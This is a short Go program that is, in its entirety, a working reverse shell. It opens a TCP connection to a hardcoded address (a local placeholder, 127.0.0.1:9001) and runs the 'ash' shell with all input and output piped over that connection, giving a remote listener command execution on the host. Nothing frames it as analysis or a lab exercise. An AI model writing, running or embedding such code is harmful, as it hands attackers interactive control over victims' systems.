package main
import (
 "net"
 "os"
 "os/exec"
)
var connectString string = "127.0.0.1:9001"
func main() {
if len(connectString) == 0 {
  os.Exit(1)
 }
conn, err := net.Dial("tcp", connectString)
 if err != nil {
  os.Exit(1)
 }
cmd := exec.Command("ash")
 cmd.Stdin = conn
 cmd.Stdout = conn
 cmd.Stderr = conn
cmd.Run()
}
